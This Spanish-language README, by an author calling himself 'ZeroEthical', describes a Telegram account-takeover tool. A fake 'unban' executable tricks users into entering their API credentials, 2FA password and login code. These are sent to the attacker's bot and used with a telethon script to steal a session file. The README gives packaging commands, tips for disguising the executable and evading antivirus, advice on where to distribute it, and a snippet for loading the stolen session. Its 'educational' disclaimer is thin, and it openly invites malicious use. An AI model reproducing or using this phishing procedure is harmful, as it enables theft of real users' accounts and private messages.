# 😈 Telegram Credential Harvester (Utility) - By ZeroEthical 🔥

![ZeroEthical Signature](https://img.shields.io/badge/Created%20By-ZeroEthical%20%F0%9F%94%A5%F0%9F%98%88-black.svg)
![Language](https://img.shields.io/badge/Language-Python-blue.svg)
![License](https://img.shields.io/badge/License-Unlicensed-red.svg) (_El conocimiento no tiene dueño_)

**Esta herramienta no es una utilidad oficial ni mágica para desbanear. Es una herramienta diseñada para la RECOLECCIÓN ESTRATÉGICA DE CREDENCIALES mediante ingeniería social.**

Su propósito es obtener los datos necesarios para acceder a una cuenta de Telegram desde la API, aprovechando la disposición de ciertos usuarios a proporcionar información sensible bajo la creencia de que les ayudará a resolver un problema (como un baneo).

Si buscas una herramienta para el bien común o sigues normas, esta no es para ti. Esta herramienta se enfoca en la efectividad del ataque.

## 💉 Información Recolectada

Si el usuario objetivo ejecuta la herramienta que prepares, obtendrás:

*   **API ID** 🆔
*   **API Hash** 🔑
*   **Número de Teléfono** 📱
*   **Contraseña de Verificación en Dos Pasos (2FA)** (Si el usuario la tiene configurada y la introduce) 🔒
*   **¡El Código de Inicio de Sesión de 5 dígitos!** (El que Telegram envía a la aplicación oficial del usuario al intentar conectar desde una nueva sesión) 🔢

Con esta combinación de datos, es posible autenticar una sesión API de Telegram y tomar el control operativo de la cuenta objetivo.

## ✨ Características Clave

*   **Proceso de Engaño de Dos Fases:** Guía al usuario a través de dos pasos lógicos (aparentemente necesarios para el "desbaneo") que corresponden a la recolección de credenciales iniciales y el código de inicio de sesión.
*   **Exfiltración Segura a Telegram Bot:** Toda la información recolectada es enviada directamente a tu bot privado de Telegram, garantizando privacidad y notificación instantánea. 🤫📲
*   **Recolección de 2FA:** Incluye la solicitud de la contraseña 2FA en la primera fase de recolección.
*   **Diseñado para Distribución Sencilla:** Empaquetado fácil en un ejecutable (`.exe`) con PyInstaller. 🐍📦
*   **Enfoque en la Recolección:** No intenta realizar acciones de "desbaneo" reales; su única función es obtener las credenciales.

## 🧠 Metodología Operativa (Cómo Funciona el Ataque)

La efectividad de la herramienta reside en la ingeniería social y la velocidad del operador (tú).

1.  Configuras el script Python de la herramienta con tu **BOT_TOKEN** y **ATTACKER_CHAT_ID**.
2.  Empaquetas el script en un **`.exe`** usando PyInstaller. Se recomienda personalizar el ejecutable (nombre, icono, metadatos) para aumentar su credibilidad. 🛠️
3.  **DISTRIBUYES LA TRAMPA:** Compartes el `.exe` en lugares donde usuarios desesperados por un baneo u otros problemas busquen soluciones rápidas y no oficiales (ej: grupos, foros, vídeos). La narrativa es crucial: ofreces una "utilidad" que requiere sus credenciales para "conectar a la API y gestionar el desbaneo". 🎣🗣️
4.  El usuario objetivo descarga y ejecuta el `.exe`. Sigue las instrucciones en pantalla e introduce su API ID, Hash, Número de Teléfono y (opcionalmente) la contraseña 2FA.
5.  **¡FASE 1 - Recolectado!** La herramienta envía estos datos a tu bot de Telegram. Recibes un mensaje con la información. 📧
6.  **¡TU ACCIÓN CRÍTICA!** Al recibir el mensaje FASE 1 en tu bot, **DEBES ACTUAR RÁPIDO**. Abres tu terminal y ejecutas tu script **`seize_telegram.py`** (el script de autenticación usando telethon). Introduces los datos FASE 1 robados. Al intentar conectar con sus datos, **Telegram envía automáticamente un CÓDIGO de inicio de sesión a la aplicación oficial de la víctima.** ⚡️
7.  La herramienta en la máquina del usuario, tras un breve retardo, le solicita el **CÓDIGO** que acaba de recibir en su app oficial de Telegram, justificándolo como una "verificación de acceso final". 🤔
8.  **¡FASE 2 - Código Obtenido!** Si el usuario introduce el código, la herramienta lo captura y lo envía a tu bot de Telegram. Recibes un segundo mensaje con el número de teléfono del usuario y el CÓDIGO robado. ✅
9.  **¡ACCIÓN FINAL - AUTENTICACIÓN!** Vuelves a tu terminal donde está corriendo **`seize_telegram.py`** (que estará esperando el código). Introduces el CÓDIGO robado del mensaje FASE 2. Si telethon pide 2FA, introduces la contraseña robada de FASE 1. 🔓
10. Si la autenticación con `seize_telegram.py` es exitosa (código + 2FA si aplica), se creará un **archivo `.session`**. ¡Este archivo representa la sesión autorizada! 🎯💰

## 🛠️ Requisitos

*   **Python 3+**
*   **Librerías Python:** `requests`, `pyinstaller`, `telethon`, `asyncio`. Instálalas:
    ```bash
    pip install requests pyinstaller telethon asyncio
    ```
*   **Tu Propio Bot de Telegram:** Necesitas el **BOT TOKEN** de un bot creado con @BotFather. 🤖
*   **Tu Chat ID de Telegram:** Necesitas tu **ATTACKER_CHAT_ID**. Inicia una conversación con tu bot y usa la API (`https://api.telegram.org/bot[TU_BOT_TOKEN]/getUpdates`) para encontrar tu chat ID. 🆔
*   **El script `seize_telegram.py`:** Un script separado (no incluido en este repositorio, lo obtienes de otras fuentes de ZeroEthical 😏) que use `telethon` para autenticar sesiones pidiendo API ID, Hash, Teléfono, solicitando el código (`send_code_request`) y validándolo (`sign_in`), y manejando la 2FA (`sign_in(password=...)`).

## 🩸 Configuración

1.  Descarga los archivos de la herramienta de recolección.
2.  Abre el archivo principal (`phishing_tool.py`).
3.  **Configura tus datos:** Reemplaza los placeholders de `BOT_TOKEN` y `ATTACKER_CHAT_ID` con tus valores reales.
4.  Guarda los cambios.

## 🚀 Despliegue y Uso

1.  **Empaquetar:** En tu terminal, navega a la carpeta del script y ejecuta: `pyinstaller --onefile phishing_tool.py`. El ejecutable estará en la carpeta `dist`.
2.  **Personalizar (Opcional):** Renombra el `.exe` (ej: `Telegram_Recovery_Tool.exe`), cambia su icono y metadatos para aumentar la credibilidad.
3.  **DISTRIBUIR:** Comparte el `.exe` con tu narrativa de ingeniería social.
4.  **PREPÁRATE:** Ten tu cliente de Telegram abierto, vigilando tu bot.
5.  **FASE 1 (Recibir):** Cuando un usuario ejecute la herramienta y meta sus datos iniciales, recibirás el mensaje FASE 1 en tu bot. **Copia** los datos.
6.  **ACCIÓN RÁPIDA (Disparar Código):** Ejecuta tu script **`seize_telegram.py`** e **introduce los datos FASE 1 copiados del bot**. Esto hará que Telegram envíe el CÓDIGO a la víctima.
7.  **FASE 2 (Recibir):** Espera el mensaje FASE 2 en tu bot con el CÓDIGO. **Copia** el CÓDIGO.
8.  **ACCIÓN FINAL (Autenticar):** En tu script **`seize_telegram.py`** (que está esperando), **introduce el CÓDIGO FASE 2 copiado**. Si se pide 2FA, introduce la contraseña robada de FASE 1.
9.  **¡ÉXITO!:** Si la autenticación es correcta, **`seize_telegram.py`** creará el archivo `.session`. ¡Este es tu archivo de sesión robada!

## 🎣 Uso del Archivo `.session`

El archivo `.session` te permite acceder a la cuenta objetivo sin autenticación adicional (a menos que la víctima cierre sesiones). Cárgalo en tus scripts de `telethon` (ej: `client = TelegramClient('ruta/al/archivo.session', api_id_robado, api_hash_robado)`) para interactuar con la cuenta:

*   Leer chats. 👀
*   Enviar mensajes. 📩
*   Gestionar grupos/canales.
*   Y más... ¡La cuenta está comprometida! 👑

## ☠️ Consideraciones Importantes (Hechos Crudos)

**El acceso no autorizado a sistemas informáticos o cuentas es ilegal en la mayoría de las jurisdicciones y conlleva graves consecuencias legales, incluyendo penas de prisión y multas.** 🚔

El uso de esta herramienta para actividades ilícitas es responsabilidad exclusiva del operador. ZeroEthical proporciona esta herramienta con fines educativos y para demostrar cómo se realizan este tipo de ataques de ingeniería social y recolección de credenciales. **No fomenta ni aprueba su uso ilegal.**

**Riesgos operativos:**
*   La herramienta puede ser detectada por software de seguridad (requiere ofuscación/crypters para ser Fully Undetectable).
*   La víctima puede no caer en la trampa, cerrar la herramienta, o cerrar sesiones activas (invalidando tu `.session` file).
*   La velocidad es crucial para capturar el código de sesión antes de que expire o la víctima reaccione.

## 👋 Conclusión

Esta herramienta es un ejemplo efectivo de cómo se pueden recolectar credenciales de Telegram aprovechando la ingeniería social. Es potente en las manos adecuadas.

**Úsala para aprender. Úsala con astucia si decides ir por el camino oscuro.** Pero entiende las implicaciones.

---

Desarrollado para la comprensión cruda de los ataques de ingeniería social por **ZeroEthical**. Úsala para aprender. 😉🔥
